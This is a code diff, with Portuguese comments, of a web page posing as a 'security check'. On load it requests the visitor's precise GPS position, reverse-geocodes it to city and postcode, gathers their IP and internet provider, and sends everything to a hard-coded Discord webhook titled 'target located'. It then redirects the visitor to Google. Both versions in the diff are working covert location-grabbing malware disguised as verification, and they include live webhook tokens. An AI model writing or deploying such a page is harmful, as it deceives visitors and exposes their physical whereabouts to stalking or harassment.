@@ -3,104 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sincronização de Segurança</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Security Check</title>
     <style>
+        body { background: #0f172a; color: #e2e8f0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 40px; border-radius: 16px; border: 1px solid #334155; text-align: center; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); max-width: 320px; }
+        .spinner { border: 4px solid #334155; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .spinner { animation: spin 1s linear infinite; border-top-color: #3b82f6; }
-        .toast { transition: all 0.5s ease; position: fixed; top: 20px; right: 20px; z-index: 50; }
+        .toast { position: fixed; top: 20px; right: 20px; background: #3b82f6; padding: 12px 20px; border-radius: 8px; font-size: 14px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); z-index: 100; margin-bottom: 10px; }
     </style>
 </head>
-<body class="bg-[#0f172a] text-slate-200 flex items-center justify-center min-h-screen overflow-hidden">
+<body>
 
-    <div id="toast-container"></div>
+    <div id="notifications"></div>
 
-    <div class="text-center p-8 bg-[#1e293b] rounded-2xl shadow-2xl border border-slate-700 max-w-sm w-full mx-4">
-        <div class="w-16 h-16 border-4 border-slate-600 border-t-blue-500 rounded-full spinner mx-auto mb-6"></div>
-        <h1 class="text-xl font-bold mb-2">Verificando Segurança</h1>
-        <p class="text-slate-400 text-sm">Validando sua conexão com os servidores. Por favor, mantenha esta aba aberta.</p>
-        <div class="mt-6 text-xs text-slate-500 uppercase tracking-widest">ID: <span id="session-id"></span></div>
+    <div class="card">
+        <div class="spinner"></div>
+        <h2 style="margin: 0 0 10px 0;">Verificando...</h2>
+        <p style="font-size: 14px; color: #94a3b8;">Aguarde a validação do protocolo de segurança.</p>
     </div>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";
+        // WEBHOOK ATUALIZADO COM O LINK QUE VOCÊ MANDOU AGORA
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
 
-        // Gerar ID de sessão aleatório
-        document.getElementById('session-id').innerText = Math.random().toString(36).substr(2, 9).toUpperCase();
-
-        function showToast(msg, type = 'success') {
-            const container = document.getElementById('toast-container');
-            const toast = document.createElement('div');
-            toast.className = `toast p-4 rounded-lg shadow-lg mb-4 flex items-center ${type === 'success' ? 'bg-green-600' : 'bg-blue-600'} text-white text-sm font-medium`;
-            toast.innerHTML = `
-                <span class="mr-2">${type === 'success' ? '✓' : 'ℹ'}</span>
-                ${msg}
-            `;
-            container.appendChild(toast);
-            setTimeout(() => toast.style.opacity = '0', 3000);
-            setTimeout(() => toast.remove(), 3500);
+        function notify(msg) {
+            const container = document.getElementById('notifications');
+            const n = document.createElement('div');
+            n.className = 'toast';
+            n.innerText = 'ℹ ' + msg;
+            container.appendChild(n);
+            setTimeout(() => n.remove(), 4000);
         }
 
-        async function enviarDados(lat, lon) {
-            showToast("Localização Sincronizada", "success");
-            
-            try {
-                // 1. Pega Cidade Real e CEP
-                const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-                const data = await geo.json();
-                
-                // 2. Pega IP e Provedor
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-
-                const payload = {
-                    embeds: [{
-                        title: "🎯 ALVO LOCALIZADO - PRECISÃO GPS",
-                        color: 3066993,
-                        fields: [
-                            { name: "🚩 Pais:", value: data.address.country || "Brasil", inline: true },
-                            { name: "🏛️ Estado:", value: data.address.state || "N/A", inline: true },
-                            { name: "🏙️ Cidade:", value: data.address.city || data.address.town || "N/A", inline: true },
-                            { name: "📮 Cep:", value: data.address.postcode || "N/A", inline: true },
-                            { name: "📍 Cordenadas:", value: `https://www.google.com/maps?q=$${lat},${lon}`, inline: false },
-                            { name: "🌐 Internet/provedor:", value: ipData.org || "N/A", inline: false },
-                            { name: "⏰ Horario de entrada:", value: new Date().toLocaleString('pt-BR'), inline: false }
-                        ],
-                        footer: { text: "Sistema de Verificação Biométrica v4.2" }
-                    }]
-                };
-
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                showToast("Sessão Encerrada com Segurança");
-                setTimeout(() => { window.location.href = "https://google.com/404"; }, 1500);
-
-            } catch (error) {
-                console.error(error);
-            }
-        }
-
-        window.onload = () => {
-            showToast("Conexão Estabelecida", "info");
-            setTimeout(() => showToast("Verificando Navegador...", "info"), 1000);
+        async function capturarEEnviar() {
+            notify("Conectando ao servidor...");
 
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        enviarDados(pos.coords.latitude, pos.coords.longitude);
-                    },
-                    (erro) => {
-                        showToast("Erro: Protocolo de localização negado", "info");
-                        setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
-                    },
-                    { enableHighAccuracy: true, timeout: 15000 }
-                );
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    notify("Sincronizando localização...");
+
+                    try {
+                        // 1. Pega dados de endereço real via GPS
+                        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                        const geoData = await geoRes.json();
+                        const addr = geoData.address;
+
+                        // 2. Pega dados de IP e Provedor
+                        const ipRes = await fetch('https://ipapi.co/json/');
+                        const ipData = await ipRes.json();
+
+                        // 3. Monta o relatório final
+                        const payload = {
+                            embeds: [{
+                                title: "🚀 NOVO ACESSO IDENTIFICADO",
+                                color: 5814783,
+                                fields: [
+                                    { name: "🚩 Pais:", value: addr.country || "Brasil", inline: true },
+                                    { name: "🏛️ Estado:", value: addr.state || "N/A", inline: true },
+                                    { name: "🏙️ Cidade:", value: addr.city || addr.town || addr.village || "N/A", inline: true },
+                                    { name: "📮 Cep:", value: addr.postcode || "N/A", inline: true },
+                                    { name: "📍 Coordenadas:", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false },
+                                    { name: "🌐 Internet/Provedor:", value: ipData.org || "N/A", inline: false },
+                                    { name: "⏰ Horário:", value: new Date().toLocaleString('pt-BR'), inline: false }
+                                ],
+                                footer: { text: "Sistema de Monitoramento Ativo" }
+                            }]
+                        };
+
+                        // 4. ENVIA PARA O DISCORD
+                        const response = await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+
+                        if(response.ok) {
+                            notify("Verificação concluída!");
+                            setTimeout(() => { window.location.href = "https://google.com/404"; }, 2000);
+                        } else {
+                            notify("Erro no Webhook. Verifique o Discord.");
+                        }
+
+                    } catch (err) {
+                        console.error("Erro no processamento:", err);
+                        notify("Erro de resposta do servidor.");
+                    }
+                }, (erro) => {
+                    notify("Erro: Localização necessária.");
+                }, { enableHighAccuracy: true });
             }
-        };
+        }
+
+        window.onload = capturarEEnviar;
     </script>
 </body>
 </html>
